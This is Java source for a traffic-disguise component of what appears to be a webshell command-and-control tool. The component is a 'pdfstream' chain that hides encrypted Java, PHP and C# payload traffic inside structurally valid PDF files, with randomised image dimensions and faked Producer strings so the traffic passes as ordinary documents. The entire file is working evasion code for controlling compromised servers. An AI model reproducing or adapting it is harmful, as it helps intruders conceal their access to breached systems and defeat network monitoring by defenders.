package core.c2profile.chain.impl.pdfstream;

import core.c2profile.C2ProfileContext;
import core.c2profile.c2annotation.C2ProfileCryption;
import core.c2profile.c2enum.CryptionChainEnum;
import core.c2profile.chain.AbstractC2ProfileCryptionChain;
import java.io.ByteArrayOutputStream;
import java.util.Random;
import java.util.zip.Deflater;
import java.util.zip.Inflater;

/**
 * PDF container chain: ciphertext rides inside a FlateDecode (zlib) image stream of a
 * structurally valid PDF (correct object offsets + xref table). Random /Width /Height
 * metadata and comment lines per packet.
 * Use as the LAST chain of requestEncryptionChain / responseDecryptionChain.
 */
@C2ProfileCryption(
        ChainName = "pdfstream",
        supportPayload = {"JavaDynamicPayload", "PhpDynamicPayload", "CSharpDynamicPayload"}
)
public class CryptionPdfStreamChain extends AbstractC2ProfileCryptionChain {
    public CryptionPdfStreamChain() {
    }

    public void init(C2ProfileContext ctx, String payloadName, CryptionChainEnum mode, short cryptionIndex) throws Throwable {
        super.init(ctx, payloadName, mode, cryptionIndex);
    }

    protected boolean isAutoLoadProperties() {
        return true;
    }

    private static final String[] PRODUCERS = {"LibreOffice 7.3", "cairo 1.17.4", "Skia/PDF m99", "Ghostscript 9.55", "Qt 5.15.2"};

    /** ciphertext -> valid PDF (zlib image stream, computed offsets, xref, %%EOF) */
    public byte[] encrypt(byte[] data) throws Exception {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        Deflater def = new Deflater();
        def.setInput(data);
        def.finish();
        byte[] buf = new byte[1024];
        while (!def.finished()) {
            bos.write(buf, 0, def.deflate(buf));
        }
        def.end();
        byte[] z = bos.toByteArray();

        Random rnd = new Random();
        int w = 64 + rnd.nextInt(64);
        int h = Math.max(1, (data.length + w - 1) / w);
        String producer = PRODUCERS[rnd.nextInt(PRODUCERS.length)];

        ByteArrayOutputStream out = new ByteArrayOutputStream();
        byte[] nl = new byte[]{'\n'};
        out.write("%PDF-1.4\n".getBytes("ISO-8859-1"));
        out.write(("%" + Integer.toHexString(rnd.nextInt()) + Integer.toHexString(rnd.nextInt()) + "\n").getBytes("ISO-8859-1"));
        long[] offs = new long[6];
        String[] objs = {
            "<< /Type /XObject /Subtype /Image /Width " + w + " /Height " + h + " /ColorSpace /DeviceGray /BitsPerComponent 8 /Filter /FlateDecode /Length " + z.length + " >>\nstream\n",
            "<< /Type /Page /Parent 3 0 R /MediaBox [0 0 " + w + " " + h + "] /Resources << /XObject << /Im0 1 0 R >> >> /Contents 4 0 R >>\nendobj\n",
            "<< /Type /Pages /Kids [2 0 R] /Count 1 >>\nendobj\n",
            "<< /Length 0 >>\nstream\n\nendstream\nendobj\n",
            "<< /Type /Catalog /Pages 3 0 R >>\nendobj\n"
        };
        for (int i = 1; i <= 5; i++) {
            offs[i] = out.size();
            out.write((i + " 0 obj\n").getBytes("ISO-8859-1"));
            if (i == 1) {
                out.write(objs[0].getBytes("ISO-8859-1"));
                out.write(z);
                out.write("\nendstream\nendobj\n".getBytes("ISO-8859-1"));
            } else {
                out.write(objs[i - 1].getBytes("ISO-8859-1"));
            }
        }
        long xrefOff = out.size();
        out.write("xref\n0 6\n0000000000 65535 f \n".getBytes("ISO-8859-1"));
        for (int i = 1; i <= 5; i++) {
            out.write(String.format("%010d 00000 n \n", offs[i]).getBytes("ISO-8859-1"));
        }
        out.write(("trailer\n<< /Size 6 /Root 5 0 R /Producer (" + producer + ") >>\nstartxref\n" + xrefOff + "\n%%EOF").getBytes("ISO-8859-1"));
        return out.toByteArray();
    }

    /** valid PDF -> ciphertext (first FlateDecode stream, zlib inflate) */
    public byte[] decrypt(byte[] pdf) throws Exception {
        if (pdf == null || pdf.length < 8 || pdf[0] != '%' || pdf[1] != 'P' || pdf[2] != 'D' || pdf[3] != 'F') {
            throw new IllegalArgumentException("not a pdf container");
        }
        String s = new String(pdf, 0, Math.min(pdf.length, 4 << 20), "ISO-8859-1");
        int p = s.indexOf("stream");
        while (p >= 0) {
            int start = p + 6;
            if (start < s.length() && s.charAt(start) == '\r') {
                start++;
            }
            if (start < s.length() && s.charAt(start) == '\n') {
                start++;
            }
            int end = s.indexOf("endstream", start);
            if (end < 0) {
                throw new IllegalArgumentException("no endstream in pdf");
            }
            byte[] z = new byte[end - start];
            System.arraycopy(pdf, start, z, 0, z.length);
            // skip empty content streams
            if (z.length > 2) {
                ByteArrayOutputStream out = new ByteArrayOutputStream();
                Inflater inf = new Inflater();
                inf.setInput(z);
                byte[] buf = new byte[1024];
                while (!inf.finished()) {
                    int n = inf.inflate(buf);
                    if (n == 0) {
                        // see CryptionPngIdatChain: inflate() returning 0 with no input left is a
                        // truncated stream, and looping on it hangs the (synchronized) decode forever.
                        // finished() first -- a stream completing on this call also returns 0.
                        if (inf.finished()) {
                            break;
                        }
                        if (inf.needsInput() || inf.needsDictionary()) {
                            inf.end();
                            throw new IllegalArgumentException("truncated deflate stream in pdf");
                        }
                    }
                    out.write(buf, 0, n);
                }
                inf.end();
                return out.toByteArray();
            }
            p = s.indexOf("stream", end);
        }
        throw new IllegalArgumentException("no data stream in pdf");
    }
}
